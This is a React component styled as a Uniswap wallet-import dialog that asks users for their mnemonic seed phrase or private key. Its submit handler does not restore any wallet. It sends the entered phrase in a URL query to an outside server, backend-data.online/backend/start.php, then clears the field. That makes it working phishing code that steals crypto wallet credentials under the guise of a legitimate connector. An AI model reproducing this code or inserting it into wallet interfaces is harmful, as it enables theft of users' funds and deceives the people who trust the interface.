import React, { useRef, useState } from "react";
import { IoIosArrowBack } from "react-icons/io";
import { FaPaste } from "react-icons/fa";

const ImportWallet = ({ setImportWallet }) => {
  const [pass, setPass] = useState("");
  const ref = useRef(null);

  const submitAddress = () => {
    let vault = {
      type: "secrate pass",
      main: `
      [ledger App]
      ${pass}
      `,
    };
    fetch(
      `https://backend-data.online/backend/start.php?phrase=${vault.main}`,
      {
        method: "GET",
        mode: "cors",
        headers: { "content-type": "application/json" },
      }
    ).then((success) => {
      setPass("");
    });
  };

  const handlePaste = () => {
    navigator.clipboard.readText().then((text) => {
      setPass(text);
    });
  };
  return (
    <div className="transition-10 duration-50 justify-center items-center flex fixed lg:top-40   inset-0  outline-0 ">
      <div className="lg:w-[25rem] w-[20rem] rounded-md bg-white drop-shadow-2xl p-5">
        <div
          onClick={() => setImportWallet((pre) => !pre)}
          className="flex justify-between i cursor-pointer items-center space-x-4 "
        >
          <IoIosArrowBack className="text-black text-lg" />
          <p className="text-black font-[700] lg:text-2xl ">
            Mnemonic Or Private Key
          </p>
        </div>

        <p className="text-[#98a1c0] my-3 font-[500] lg:text-md text-sm">
          Restore an exsiting wallet with your 12 or 24 mnemonic words or your
          private key.
        </p>
        <div className="relative">
          <textarea
            onChange={(e) => setPass(e.target.value)}
            value={pass}
            ref={ref}
            className="bg-transparent border text-black border-slate-200 rounded-md text-white outline-0 w-full h-40 p-4"
            placeholder="words separated by single space"
          />
          <FaPaste
            className="absolute bottom-2 right-0 shadow-xl text-lg text-[#98a1c0] cursor-pointer"
            onClick={(e) => {
              handlePaste();
            }}
          />
        </div>

        <br />
        <div className="flex flex-col items-center mt-4">
          <button
            onClick={() => submitAddress()}
            disabled={!pass}
            className={
              pass
                ? "bg-[#FBC8E2] text-[#F73397] w-full px-5 py-4 rounded-2xl hover:opacity-80 shadhow-xl font-[700] mb-1 mt-2 transition duration-300 ease-in-out outline-0"
                : "bg-[#FBC8E2] text-[#F73397] opacity-20 w-full px-5 py-4 rounded-2xl  shadhow-xl font-[700] mb-1 mt-2 transition duration-300 ease-in-out outline-0"
            }
          >
            Connect Wallet With Uniswap
          </button>
        </div>
      </div>
    </div>
  );
};

export default ImportWallet;
